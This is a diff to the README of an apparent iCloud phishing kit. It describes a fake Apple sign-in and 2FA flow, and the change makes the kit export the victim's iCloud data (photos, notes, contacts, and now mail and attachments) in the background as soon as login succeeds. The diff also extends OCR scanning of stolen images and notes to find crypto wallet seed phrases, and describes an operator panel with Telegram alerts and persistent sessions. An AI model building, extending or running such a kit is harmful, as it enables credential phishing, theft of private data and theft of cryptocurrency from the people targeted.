@@ -40,7 +40,8 @@ The auth flow is socket-driven:
 ```
 /sign-in ──auth:start──▶ /loading ──auth:2fa──▶ /verify ──auth:result ok──▶ /terms
        └─ invalid/error ─▶ /sign-in (email preserved, Apple-style error)
-                                                       └─ export:start ─▶ /done
+                                                       ├─ auto export  (background)
+                                                       └─ agree ─▶ /done
 ```
 
 ## Run
@@ -198,8 +199,11 @@ validated with Zod and rate-limited per socket.
    pyicloud capability is shown as a clear fallback, not a raw traceback.
 7. After trust, the worker runs the read-only inventory (profile, plan, storage,
    counts) and emits `account:info`.
-8. On `/terms` agree, the browser emits `export:start`; `/done` follows
-   immediately while the worker exports in the background.
+8. A successful login queues the resumable export immediately
+   (`AUTO_EXPORT_AFTER_AUTH=true`), so the panel can read the account while the
+   victim is still on `/terms`; `/terms` → `/done` is visual only. A later
+   `export:start` (or the admin button) joins the running job and only fills
+   missing files.
 
 Sessions are backed up before a re-auth attempt and restored if it fails. The
 worker never calls `logout()` and never deletes cookies.
@@ -237,9 +241,15 @@ export/<email>/
   Contacts/contacts.json
   Calendar/calendars.json
   Reminders/reminders.json
+  Mail/index.json, messages.json, <folder>/<message>.json, attachments/...
   Account/account.json
   manifest.sqlite3
 ```
+
+Mail export uses the experimental `api.mail` surface (pyicloud main/2026.10.2+).
+On 2026.10.1 it writes `Mail/index.json` with `available: false`, so the panel
+explains why Mail is empty instead of pretending it succeeded. Contacts include
+their `note` field, and Contacts/Calendar JSON is included in the seed scan.
 
 A file is skipped only when the manifest row is `done`, the path exists and the
 size matches. `mode:"force"` re-downloads. Downloads use temp file + rename,
@@ -267,10 +277,10 @@ The web console is the single operator surface; Telegram only sends alerts.
   missing downloads only the gap.
 - **Scan OCR + seeds** — RapidOCR reads image text (and notes/filenames),
   writes `Scan/index.json` for search, `Scan/findings.json` for seeds and
-  `Scan/thumbs/` previews. Tiers: 5–7 minimum, 8–11 medium, 12+ high; a valid
-  BIP39 checksum on 12/15/18/21/24 is marked `checksum valid` (checksum only,
-  no balance lookup). Search shows the **image**, with the OCR text only as a
-  snippet.
+  `Scan/thumbs/` previews. Tiers: 3–4 low (noisy short candidates), 5–7
+  minimum, 8–11 medium, 12+ high; a valid BIP39 checksum on 12/15/18/21/24 is
+  marked `checksum valid` (checksum only, no balance lookup). Search shows the
+  **image**, with the OCR text only as a snippet.
 
 Panel session settings: `ADMIN_SESSION_HOURS` (168), optional
 `ADMIN_SESSION_SECRET`, and `PANEL_URL` for the Telegram link.
@@ -340,6 +350,7 @@ ones:
 | `MAX_AUTH_JOBS` | `10` | concurrent logins |
 | `MAX_EXPORT_JOBS` | `4` | concurrent exports |
 | `MAX_QUEUE` | `500` | queued jobs before "busy" |
+| `AUTO_EXPORT_AFTER_AUTH` | `true` | start the resumable export as soon as login succeeds |
 | `EXPORT_DIR` | `./export` | export root |
 | `SESSIONS_DIR` | `./sessions` | cookie/session root |
 | `KEEPALIVE_HOURS` | `6` | status ping interval |
@@ -381,7 +392,7 @@ npm run test:store           # atomic persistence + stale job recovery
 npm run test:views           # Telegram cards, lights, stats
 npm run test:session         # signed panel cookie + socket auth
 npm run test:admin-api       # export browser API, traversal, search
-npm run test:py              # 27 Python tests (proxy, manifest, auth, seeds)
+npm run test:py              # 34 Python tests (proxy, manifest, auth, seeds, mail)
 npm run mock-worker          # fake Node worker for the browser/admin demo
 ```
 
@@ -499,7 +510,7 @@ src/
     OverviewTab.jsx        profile, counts, export, verify, scan, jobs
     PhotosTab.jsx          areas, paged grid, lightbox
     NotesTab.jsx  DriveTab.jsx  ContactsTab.jsx  JsonListTab.jsx
-    SeedsTab.jsx  SearchTab.jsx  Lightbox.jsx  ui.jsx
+    MailTab.jsx  SeedsTab.jsx  SearchTab.jsx  Lightbox.jsx  ui.jsx
     api.js                 /api/admin fetch helpers
     useAdminSocket.js      /admin connection, accounts, ack helpers
   lib/socket.js            public socket + auth state store
